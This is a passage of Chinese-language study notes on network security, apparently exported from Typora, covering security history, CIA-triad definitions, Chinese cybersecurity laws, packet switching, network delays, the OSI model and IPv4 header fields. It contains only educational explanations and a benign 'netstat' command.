Techniques, and Common Knowledge, ATT&amp;CK)</span></p><p><span>，这是一个站在攻击者的视角来描述攻击中各阶段用到的技术的模型。</span></p><p><span>2013 年，Michigan 大学开始了 ZMap 项目，在 2015 年这个项目演化为 Censys ，从这之后网络空间测绘的项目逐渐出现。</span></p><p><span>2014 年，在 Gartner Security and Risk Management Summit 上，Runtime Application Self-protection (RASP)</span></p><p><span>的概念被提出，在应用层进行安全保护。</span></p><p><span>2015 年，Gartner 首次提出了 SOAR 的概念，最初的定义是 Security Operations, Analytics and Reporting，即安全运维分析与报告。</span></p><p><span>2017 年，Gartner 对 SOAR 概念做了重新定义：Security Orchestration, Automation and Response, 即安全编排、自动化与响应。</span></p></blockquote><h3 id='122--参考链接'><span>1.2.2  参考链接</span></h3><ul><li><a href='https://en.wikipedia.org/wiki/OWASP'><span>OWASP</span></a></li><li><a href='http://www.phrack.com/issues.html?issue=54&amp;id=8'><span>NT Web Technology Vulnerabilities</span></a></li><li><a href='https://cve.mitre.org/about/history.html'><span>History of CVE</span></a></li><li><a href='https://documents.pub/document/history-of-some-vulnerabilities-and-exploit-techniques.html'><span>history of some vulnerabilities and exploit techniques</span></a></li><li><a href='http://securitydigest.org/'><span>securitydigest</span></a></li><li><a href='http://seclab.cs.ucdavis.edu/projects/history/CD/'><span>Early Computer Security Papers: Ongoing Collection</span></a></li><li><a href='https://seclists.org/'><span>Security Mailing List Archive</span></a></li><li><a href='https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf'><span>Computer Security Technology Planning Study</span></a></li><li><a href='https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf'><span>Smashing The Stack For Fun And Profit</span></a></li><li><a href='https://docs.microsoft.com/en-us/archive/blogs/dross/happy-10th-birthday-cross-site-scripting'><span>Happy 10th birthday Cross-Site Scripting!</span></a></li><li><a href='https://www.microsoft.com/en-us/securityengineering/sdl/about'><span>About Microsoft SDL</span></a></li><li><a href='https://www.zerodayinitiative.com/about/'><span>ABOUT ZDI</span></a></li><li><a href='https://en.wikipedia.org/wiki/Open-source_intelligence'><span>Open-source intelligence</span></a></li><li><a href='https://www.gartner.com/en/information-technology/glossary/runtime-application-self-protection-rasp'><span>Runtime Application Self-protection (RASP)</span></a></li><li><a href='https://zmap.io/paper.pdf'><span>ZMap: Fast Internet-Wide Scanning and its Security Applications</span></a></li><li><a href='https://censys.io/static/censys.pdf'><span>A Search Engine Backed by Internet-Wide Scanning</span></a></li><li><a href='https://www.blackhat.com/about.html'><span>Black hat About</span></a></li><li><a href='https://www.defcon.org/html/links/dc-about.html'><span>The DEF CON Story</span></a></li><li><a href='https://users.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf'><span>Reflections on Trusting Trust</span></a></li><li><a href='https://www.devsecops.org/blog/2015/2/15/what-is-devsecops'><span>What is DevSecOps?</span></a></li></ul><p>&nbsp;</p><h2 id='13--网络安全观'><span>1.3  网络安全观</span></h2><h3 id='131--网络安全定义'><span>1.3.1  网络安全定义</span></h3><blockquote><p><span>网络安全的一个通用定义指网络信息系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的破坏、更改、泄露，系统能连续、可靠、正常地运行，服务不中断。网络安全简单的说是在网络环境下能够识别和消除不安全因素的能力。</span></p><p><span>网络安全在不同环境和应用中有不同的解释，例如系统运行的安全、系统信息内容的安全、信息通信与传播的安全等。</span></p><p><span>网络安全的基本需求包括可靠性、可用性、保密性、完整性、不可抵赖性、可控性、可审查性、真实性等。其中三个最基本的要素是机密性 (Confidentiality)、完整性 (Integrity)、可用性 (Availability)。</span></p><p><span>机密性是不将有用信息泄漏给非授权用户的特性。可以通过信息加密、身份认证、访问控制、安全通信协议等技术实现，信息加密是防止信息非法泄露的最基本手段，主要强调有用信息只被授权对象使用的特征。</span></p><p><span>完整性是指信息在传输、交换、存储和处理过程中，保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。</span></p><p><span>可用性指信息资源可被授权实体按要求访问、正常使用或在非正常情况下能恢复使用的特性。在系统运行时正确存取所需信息，当系统遭受意外攻击或破坏时，可以迅速恢复并能投入使用。是衡量网络信息系统面向用户的一种安全性能，以保障为用户提供服务。</span></p><p><span>网络安全的主体是保护网络上的数据和通信的安全，数据安全性是指软硬件保护措施，用来阻止对数据进行非授权的泄漏、转移、修改和破坏等，通信安全性是通信保护措施，要求在通信中采用保密安全性、传输安全性、辐射安全性等措施。</span></p></blockquote><h3 id='132--系统脆弱性'><span>1.3.2  系统脆弱性</span></h3><blockquote><p><span>信息系统本身是脆弱的，信息系统的硬件资源、通信资源、软件及信息资源等都可能因为可预见或不可预见甚至恶意的原因而可能导致系统受到破坏、更改、泄露和功能失效，从而使系统处于异常状态，甚至崩溃瘫痪。</span></p><p><span>硬件资源的脆弱性主要表现为物理安全方面的问题，多源于设计，采用软件程序的方法见效不大。</span></p><p><span>软件的脆弱性来源于设计和软件工程实施中遗留问题，如设计中的疏忽、内部设计的逻辑混乱，没有遵守信息系统安全原则进行设计等。</span></p></blockquote><h2 id='14--法律与法规'><span>1.4  法律与法规</span></h2><h3 id='141--相关链接'><span>1.4.1  相关链接</span></h3><ul><li><a href='http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm'><span>中华人民共和国网络安全法</span></a></li><li><a href='http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm'><span>网络产品安全漏洞管理规定</span></a></li><li><a href='http://www.gov.cn/zhengce/content/2021-08/17/content_5631671.htm'><span>关键信息基础设施安全保护条例</span></a></li><li><a href='http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml'><span>中华人民共和国个人信息保护法</span></a></li><li><a href='http://www.npc.gov.cn/npc/c30834/202106/7c9af12f51334a73b56d7938f99a788a.shtml'><span>中华人民共和国数据安全法</span></a></li></ul><p><span id="_bookmark5" class="anchor"></span><span>CHAPTER 2</span></p><p>&nbsp;</p><h1 id='2--计算机网络与协议'><span>2.  计算机网络与协议</span></h1><h2 id='21--网络基础'><span>2.1  网络基础</span></h2><h3 id='计算机通信网的组成'><span>计算机通信网的组成</span></h3><p><strong><span>计算机网络由通信子网和资源子网组成。</span></strong><span>其中</span><strong><span>通信子网</span></strong><span>负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。其中</span><strong><span>资源子网</span></strong><span>是计算机通信的本地系统环境，包括主机、终端和应用程序等，资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载均衡等。</span></p><p><span>总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。</span></p><h3 id='通信协议'><span>通信协议</span></h3><p><span>为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。计算机网络中的数据交换必须要遵守事先约定好的规则（</span><strong><span>协议</span></strong><span>）。</span></p><p><strong><span>网络协议</span></strong><span>（network protocol），简称为协议，是为进行网络中的数据交换而建立的规则，标准或约定。并不是计算机网络实体的组成部分。</span></p><p><strong><span>协议</span></strong><span>规定了通信实体之间所交换的消息的格式，意义，顺序以及针对收到消息或发生的事件所采取的“动作”（actions）。</span></p><p><span>协议规范了网络中所有信息发送和接收过程。</span></p><ul><li><span>例如：TCP，IP，HTTP，Skype，802.11</span></li></ul><p><strong><span>协议</span></strong><span>涉及到三个要素，分别为：</span></p><ul><li><span>语法（Syntax）：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义（是信号电平）</span></li><li><span>语义（Semantics）：需要发出何种控制信息，完成何种动作以及做出何种响应。用于解释比特流的每一部分的意义（差错检测）</span></li><li><span>时序（Timing）：事件实现顺序的详细说明（速度匹配）</span></li></ul><h3 id='数据交换类型'><span>数据交换类型</span></h3><h4 id='电路交换'><span>电路交换</span></h4><p><span>1.最典型的电路交换网络：电话网络</span></p><p><span>2.电路交换的三个阶段：</span></p><ul><li><span>建立连接（呼叫</span>—<span>&gt;电路建立）</span></li><li><span>通信</span></li><li><span>释放连接</span></li></ul><p><span>3.特点：</span><strong><span>独占电路资源</span></strong></p><p><span>4.电路交换示意图</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505163342765.png" referrerpolicy="no-referrer" alt="image-20220505163342765"></p><h4 id='报文交换'><span>报文交换</span></h4><p><span>1.报文：源（应用）发送的信息整体（比如：一个文件，一个音频等等）</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505164414917.png" referrerpolicy="no-referrer" alt="image-20220505164414917"></p><ol start='' ><li><p><span>主机A将整段报文发送（发送时间取决于主机A输出端口的带宽）</span></p></li><li><p><span>路由器1接收报文后，先将报文放入缓存区（复制报文），确认报文正确传输后才能删除该副本</span></p></li><li><p><span>经过路由选择算法，路由器1选择通过路由器2进行传输，同时删除副本</span></p></li><li><p><span>路由器2经过相同的过程，将报文发送至主机B</span></p><ul><li><span>因为不同的报文长度不同，所以路由器只能根据最大的报文来预定存储空间（否则长报文无法完全缓存，而较短的报文肯定能缓存下来），但是如果传递的大部分报文都是短报文，会造成路由器存储空间的利用率降低</span></li><li><span>因为整段报文长度较大，所以出错可能性大，出错重传花费的时间就比较长</span></li></ul></li></ol><h4 id='分组交换'><span>分组交换</span></h4><p><span>由报文拆分出来的一系列相对较小的数据包，需要报文的拆分与重组，会产生额外的开销。</span></p><p><span>报文交换与分组交换都采用存储转发的交换方式。</span></p><p><strong><span>区别：</span></strong></p><ul><li><span>报文交换以</span><strong><span>完整的报文</span></strong><span>进行存储转发</span></li><li><span>分组交换以较小的</span><strong><span>分组</span></strong><span>进行存储转发</span></li></ul><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505164745496.png" referrerpolicy="no-referrer" alt="image-20220505164745496"></p><ol start='' ><li><p><span>将报文划分成固定格式和最大长度限制的分组进行传输（每个分组长度相同，较小的分组长度有利于查错）</span></p></li><li><p><span>不同的分组到达路由器1后，路由器1先对分组进行查错等处理</span></p></li><li><p><span>将处理好的分组放入输出端口的队列（队列中无分组时，可以直接发送，但如果有分组就需要等待前面的分组传输完成）</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505164901323.png" referrerpolicy="no-referrer" alt="image-20220505164901323"></p></li><li><p><span>路由器1经过路由选择算法选择路由器2</span></p></li><li><p><span>路由器2经过同样步骤将不同分组传输到主机B</span></p></li></ol><p><strong><span>Q：分组交换为什么会产生丢包和延迟</span></strong></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505165221795.png" referrerpolicy="no-referrer" alt="image-20220505165221795"></p><p><strong><span>分组在路由器的缓存中排队</span></strong></p><ul><li><span>分组到达速率超出链路输出容量（输出缓冲区）时，会产生丢包</span></li><li><span>分组排队，等待输出链路（排队中的分组）可用：例如图中橙色的要等它前面的紫色的分组输出后，才轮到它被发送</span></li></ul><p><strong><span>丢包了会发生什么：</span></strong></p><ul><li><span>丢弃的分组由前序结点重发</span></li><li><span>不重发</span></li></ul><p><strong><span>丢 包 率 = 丢 包 数 /已 发 分 组 总 数</span></strong></p><h3 id='计算机网络性能'><span>计算机网络性能</span></h3><h4 id='带宽bandwidth'><span>带宽(bandwidth)</span></h4><p><span>原本指信号具有的频带宽度,即最高频率与最低频率之差，单位是赫兹(Hz)。网络的“带宽”通常是数字信道所能传送的“ </span><strong><span>最高数据率</span></strong><span> ” ，单位: b/s (bps：bit per second)</span></p><p><span>1 Mb/s = 10^6 b/s ，1 Gb/s = 10^9 b/s，1 Tb/s = 10^12 b/s （ 这里的b指的是bit的缩写）</span></p><h4 id='速率'><span>速率</span></h4><p><span>即数据率（data rate）或称数据传输速率或比特率（bit rate）。速率往往指额定速率或标称速率。</span></p><ul><li><span>单位时间（秒）传输信息（比特）量，是计算机网络中最重要的一个性能指标</span></li><li><span>单位：b/s (bps：bit per second)，1 Mb/s = 10^6 b/s ，1 Gb/s = 10^9 b/s，1 Tb/s = 10^12 b/s （ 这里的b指的是bit的缩写）</span></li></ul><h4 id='4种网络延迟'><span>4种网络延迟</span></h4><p><img src="C:/Users/86184/%E6%A1%8C%E9%9D%A2/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99/%E5%9B%BE%E7%89%87/1.jpg" referrerpolicy="no-referrer" alt="1"></p><h5 id='1dproc结点处理时延'><span>1.d(proc)：结点处理时延</span></h5><ul><li><span>差错检测</span></li><li><span>确定输出链路</span></li><li><span>通常小于msec（毫秒）</span></li></ul><h5 id='2dqueue排队时延'><span>2.d(queue)：排队时延</span></h5><p><span>绝对的排队延迟比较难估计，所以一般估计平均排队延迟</span></p><ul><li><span>R：链路带宽(bps)</span></li><li><span>L：分组长度(bits)</span></li><li><span>a：平均分组到达速率</span></li></ul><p><strong><span>流量强度</span></strong><span>(trafficintensity)=La/R</span></p><ul><li><span>La/R ~ 0：平均排队延迟很小</span></li><li><span>La/R ~ 1：平均排队延迟很大</span></li><li><span>La/R &gt; 1：超出服务能力，平均排队延迟无限大（需要传输的比特数率【不是错别字，就是比特数量到达的速率】&gt; 带宽 ，那可以理解为超出服务能力：一个水龙头每秒最多放水1L，而每秒需要这个水龙头放的水是2L，水龙头表示做不到）</span></li></ul><h5 id='3dtrans传输时延'><span>3.d(trans)：传输时延</span></h5><ul><li><span>R：链路带宽(bps)</span></li><li><span>L：分组长度(bits)</span></li><li><span>d(trans)=L/R</span></li></ul><h5 id='4dprop传播时延'><span>4.d(prop)：传播时延</span></h5><ul><li><span>d：物理链路长度</span></li><li><span>s：信号传播速度（约为2x10^8m/sec）</span></li><li><span>d(prop)=d/s</span></li></ul><h5 id='时延带宽积'><span>时延带宽积</span></h5><p><span>链路的时延带宽积又称为以比特为单位的链路长度</span></p><p><strong><span>时延带宽积=传播时延*带宽=d(prop)</span><span>*</span><span>R</span></strong></p><p><em><strong><span>Q：传输延时（发送延时）与传播延时的区别</span></strong></em></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505165832075.png" referrerpolicy="no-referrer" alt="image-20220505165832075"></p><ul><li><span>货物：分组</span></li><li><span>传送带：传播链路</span></li><li><span>传送带的转速：传播链路的带宽</span></li><li><span>人搬运货物的速度：传输链路的带宽</span></li><li><span>传输延时：人将货物搬上传送带所花费的时间</span></li><li><span>传播延时：传送带将货物从起点送到终点花费的时间</span></li></ul><h3 id='网络应用的基本原理'><span>网络应用的基本原理</span></h3><h4 id='网络应用的体系结构'><span>网络应用的体系结构</span></h4><h5 id='1客户机服务器结构clientservercs'><span>1.客户机/服务器结构(Client/Server,C/S)</span></h5><p><span>服务器</span></p><ul><li><span>7*24小时提供服务</span></li><li><span>永久性访问地址/域名</span></li><li><span>利用大量服务器实现可拓展性</span></li></ul><p><span>客户机</span></p><ul><li><span>与服务器通信，使用服务器提供的服务</span></li><li><span>间歇性接入网络</span></li><li><span>可能使用动态IP地址</span></li><li><span>不会与其他客户机直接通信</span></li></ul><p><span>例如：</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508163641633.png" referrerpolicy="no-referrer" alt="image-20220508163641633"></p><p>&nbsp;</p><h5 id='2点对点结构peer-to-peerp2p）'><span>2.点对点结构（Peer-to-Peer,P2P）</span></h5><ul><li><span>没有永远在线的服务器</span></li><li><span>任意端系统/节点之间可以直接通讯</span></li><li><span>节点间歇性接入网络</span></li><li><span>节点可能改变IP地址</span></li><li><strong><span>优点：</span></strong><span>高度可伸缩</span></li><li><strong><span>缺点：</span></strong><span>难于管理</span></li></ul><h5 id='3混合结构hybrid'><span>3.混合结构(Hybrid)</span></h5><p><strong><span>Napster</span></strong><span>（一个应用）</span></p><ul><li><p><span>文件传输使用P2P结构</span></p></li><li><p><span>文件的搜索采用C/S结构</span>––<span>集中式</span></p><ul><li><span>每个节点向服务器登记自己的内容</span></li><li><span>每个节点向服务器体检查询请求，查找自己感兴趣的内容</span></li></ul></li></ul><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508164544194.png" referrerpolicy="no-referrer" alt="image-20220508164544194"></p><h4 id='网络应用进程通信'><span>网络应用进程通信</span></h4><p><span>进程间的通信是利用socket发送/接收消息来实现的。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508165812758.png" referrerpolicy="no-referrer" alt="image-20220508165812758"></p><p><span>类似于寄信：</span></p><ul><li><span>发送方将消息送到门外邮箱</span></li><li><span>发送方依赖传输基础设施将消息传到接收方所在的主机，并送到接收方门外</span></li><li><span>接收方从门外获取消息</span></li></ul><p><span>传输基础设施向进程提供API</span></p><ul><li><span>传输协议的选择</span></li><li><span>参数的设置</span></li></ul><h5 id='进程定位'><span>进程定位</span></h5><p><span>采用IP地址定位方式来寻址主机，有了主机的IP地址后，并不足以定位进程，因为主机上同时可能会跑很多进程。操作系统会给每个需要通信的进程分配一个端口号（Port number）。但是有的端口号是分配给固定的进程的，如：HTTP Server采用80端口，Mail Server采用25端口等等。</span></p><p><span>进程标识符：IP地址+端口号</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">netstat</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508170922099.png" referrerpolicy="no-referrer" alt="image-20220508170922099"></p><h5 id='应用层协议'><span>应用层协议</span></h5><p><span>网络应用需遵循应用层协议。</span></p><p><span>1.公开协议</span></p><ul><li><span>有RFC（Request For Comments）定义</span></li><li><span>允许互操作</span></li><li><span>HTTP，SMTP等等</span></li></ul><p><span>2.私有协议</span></p><ul><li><span>多数P2P文件共享应用</span></li></ul><p>&nbsp;</p><h3 id='osi-七层模型'><span>OSI 七层模型</span></h3><h4 id='简介-1'><span>简介</span></h4><p><span>OSI（Open System Interconnection）共分为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层七层，其具体的功能如下。</span></p><h4 id='物理层-1'><span>物理层</span></h4><ul><li><span>提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性</span></li><li><span>通过传输介质进行数据流 (比特流) 的物理传输、故障监测和物理层管理</span></li><li><span>从数据链路层接收帧，将比特流转换成底层物理介质上的信号</span></li></ul><h4 id='数据链路层'><span>数据链路层</span></h4><ul><li><span>在物理链路的两端之间传输数据</span></li><li><span>在网络层实体间提供数据传输功能和控制</span></li><li><span>提供数据的流量控制</span></li><li><span>检测和纠正物理链路产生的差错</span></li><li><span>格式化的消息称为</span><strong><span>帧</span></strong></li></ul><h4 id='网络层-1'><span>网络层</span></h4><ul><li><span>负责端到端的数据的路由或交换，为透明地传输数据建立连接</span></li><li><span>寻址并解决与数据在异构网络间传输相关的所有问题</span></li><li><span>使用上面的传输层和下面的数据链路层的功能</span></li><li><span>格式化的消息称为</span><strong><span>分组</span></strong></li><li><a href='#ip协议详解'><span>IP协议详解（报文格式、分类、NAT、子网、CIDR、抓包分析）</span></a></li><li><a href='#icmp协议详解'><span>ICMP协议、Ping命令实现与ICMP攻击</span></a></li><li><a href='#arp协议详解与arp欺骗中毒）攻击实战'><span>ARP协议详解与ARP欺骗（中毒）攻击实战</span></a></li></ul><h4 id='传输层'><span>传输层</span></h4><ul><li><span>提供无差错的数据传输</span></li><li><span>接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地</span></li><li><span>在系统之间提供可靠的透明的数据传输, 提供端到端的错误恢复和流量控制</span></li><li><a href='https://blog.csdn.net/lady_killer9/article/details/110533511'><span>网络-UDP协议详解（代码、实战）</span></a></li><li><a href='https://blog.csdn.net/lady_killer9/article/details/109587532'><span>网络-TCP协议详解自学笔记（例题、代码、实战）</span></a></li></ul><h4 id='会话层'><span>会话层</span></h4><ul><li><span>提供节点之间通信过程的协调</span></li><li><span>负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接</span></li><li><span>使用上面的表示层和下面的传输层的功能</span></li></ul><h4 id='表示层'><span>表示层</span></h4><ul><li><span>提供数据格式、变换和编码转换</span></li><li><span>涉及正在传输数据的语法和语义</span></li><li><span>将消息以合适电子传输的格式编码</span></li><li><span>执行该层的数据压缩和加密</span></li><li><span>从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中</span></li></ul><h4 id='应用层-1'><span>应用层</span></h4><ul><li><p><span>包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等</span></p></li><li><p><a href='https://blog.csdn.net/lady_killer9/article/details/106590907'><span>网络-http协议学习笔记（消息结构、请求方法、状态码等）</span></a></p></li><li><p><a href='https://blog.csdn.net/lady_killer9/article/details/107882912'><span>网络-https协议学习笔记（SSL、TLS、CA、抓包与修改）</span></a></p></li><li><p><a href='https://blog.csdn.net/lady_killer9/article/details/110875191'><span>网络-Telnet协议与SSH协议（命令、免密登录）及其安全性</span></a></p></li><li><p><a href='https://blog.csdn.net/lady_killer9/article/details/110562045'><span>网络-DNS域名系统详解与DNS攻击</span></a></p><p>&nbsp;</p></li></ul><h4 id='总结'><span>总结</span></h4><p><span>低三层模型属于通信子网，涉及为用户间提供透明连接，操作主要以每条链路（hop-by-hop）为基础，在节点间的各条数据链路上进行通信。由</span><strong><span>网络层</span></strong><span>来控制各条链路上的通信，但要依赖于其他节点的协调操作。</span></p><p><span>高三层属于资源子网，主要涉及保证信息以正确可理解形式传送。</span></p><p><span>传输层是高三层和低三层之间的接口，它是</span><strong><span>第一个端到端的层次</span></strong><span>，保证透明的端到端连接，满足用户的服务质量（QoS）要求，并向高三层提供合适的信息形式。</span></p><p>&nbsp;</p><h2 id='ip协议详解'><span>IP协议详解</span></h2><h3 id='简介-2'><span>简介</span></h3><p><span>IP(网际互连协议，Internet Protocol)是TCP/IP协议族中最为核心的协议。所有的 TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。网际协议IP又称为Kahn-Cerf协议，因为这个重要协议正是Robert Kahn和Vint Cerf二人共同研发的，这两位学者在2005年获得图灵奖。</span></p><h3 id='报文格式-1'><span>报文格式</span></h3><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505182529435.png" referrerpolicy="no-referrer" alt="IP报文格式"></p><ul><li><p><span>版本：占4位，指IP协议的版本。通信双方使用的IP协议的版本必须一致。目前广泛使用的IP协议版本号为4（即IPv4），以后要使用IPv6（即版本6的IP协议）。</span></p></li><li><p><span>首部长度：占4位，可表示的0~15，单位是4B。因为IP首部的固定长度是20字节，因此首部长度字段的最小值是5（即二进制表示的首部长度是0101）。而当首部长度为最大值1111时（即十进制数的15），就表明首部长度达到最大值15个32位字长，即60字节。当IP分组的首部长度不是4字节的整数倍时，必须利用最后的填充字段加以填充。因此IP数据报的数据部分永远在4字节的整数倍时开始。首部长度限制为60字节的缺点是有时可能不够用，但这样做是希望用户尽量减少开销。最常用的首部长度是20字节（即首部长度为0101），这时不使用任何选项。</span></p></li><li><p><span>区分服务：占8位，用来获得更好的服务。这个字段在旧标准中叫做服务类型，但实际上一直没有被使用过。1998年IETF把这个字段改名为区分服务DS（DifferentiatedServices)。只有在使用区分服务时，这个字段才起作用，在一般的情况下都不使用这个字段。 </span></p></li><li><p><span>总长度：占16位，指首部和数据之和的长度，单位为字节。总长度字段为16位，因此数据报的最大长度为2^16-1=65535字节。</span></p></li><li><p><span>标识（identification）占16位。IP软件在存储器中维持一个计数器，每产生一个数据报，计数器就加1，并将此值赋给标识字段。当数据报由于长度超过网络的MTU而必须分片时，这个标识字段的值就被复制到所有的数据报片的标识字段中。相同的标识字段的值使分片后的各数据报片最后能正确地重装成为原来的数据报。</span></p></li><li><p><span>标志（flag）占3位，但目前只有低两位有意义。标志字段中的最低位记为MF（More Fragment)。MF=1即表示后面“还有分片”的数据报。MF=0表示这已是若干数据报片中的最后一个。标志字段中间的一位记为DF（Don</span>’<span>t Fragment)，意思是“不能分片”。只有当DF=0时才允许分片。</span></p></li><li><p><span>片偏移占13位。片偏移指出：较长的分组在分片后，某片在原分组中的相对位置。也就是说，相对于用户数据字段的起点，该片从何处开始。片偏移以8个字节为偏移单位。这就是说，除了最后一个分片，长度一定是8字节（64位）的整数倍，最后一个分片可能是8字节（64位）的整数倍。</span></p></li><li><p><span>生存时间占8位，生存时间字段常用的英文缩写是TTL（Time To Live)，表明这是数据报在网络中的寿命。由发出数据报的源点设置这个字段。其目的是防止无法交付的数据报无限制地在互联网中兜圈子（例如从路由器R1转发到R2，再转发到R3，然后又转发到R1），因而白白消耗网络资源。最初的设计是以秒作为TTL值的单位。每经过一个路由器时，就把TTL减去数据报在路由器所消耗掉的一段时间。若数据报在路由器消耗的时间小于1秒，就把TTL值减1。当TTL值减为零时，就丢弃这个数据报。</span></p></li><li><p><span>协议占8位，协议字段指出此数据报携带的数据是使用何种协议，以便使目的主机的IP层知道应将数据部分上交给哪个协议进行处理。至少记住TCP和UDP（腾讯安全工程师笔试题)。</span></p><figure><table><thead><tr><th><span>协议名</span></th><th><span>ICMP</span></th><th><span>IGMP</span></th><th><span>IP</span></th><th><span>TCP</span></th><th><span>EGP</span></th><th><span>IGP</span></th><th><span>UDP</span></th><th><span>IPV6</span></th><th><span>ESP</span></th><th><span>OSPF</span></th></tr></thead><tbody><tr><td><span>协议字段值</span></td><td><span>1</span></td><td><span>2</span></td><td><span>4</span></td><td><span>6</span></td><td><span>8</span></td><td><span>9</span></td><td><span>17</span></td><td><span>41</span></td><td><span>50</span></td><td><span>89</span></td></tr></tbody></table></figure></li><li><p><span>首部检验和占16位。这个字段只检验数据报的首部，但不包括数据部分。这是因为数据报每经过一个路由器，路由器都要重新计算一下首部检验和（一些字段，如生存时间、标志、片偏移等都可能发生变化）。不检验数据部分可减少计算的工作量。</span></p></li><li><p><span>源地址占32位。</span></p></li><li><p><span>目的地址占32位。</span></p></li><li><p><span>可选字段：0~40B，用来支持排错、测量以及安全等措施。</span></p></li><li><p><span>填充：全0，把首部补成4B的整数倍。</span></p></li></ul><h3 id='ipv4地址'><span>IPv4地址</span></h3><h4 id='分类-1'><span>分类</span></h4><p><span>IP地址表示如下：</span></p><p><span>IP地址::={&lt;网络号&gt;，&lt;主机号&gt;}</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505183122108.png" referrerpolicy="no-referrer" alt="image-20220505183122108"></p><p><span>下面是一个C类IP地址</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" 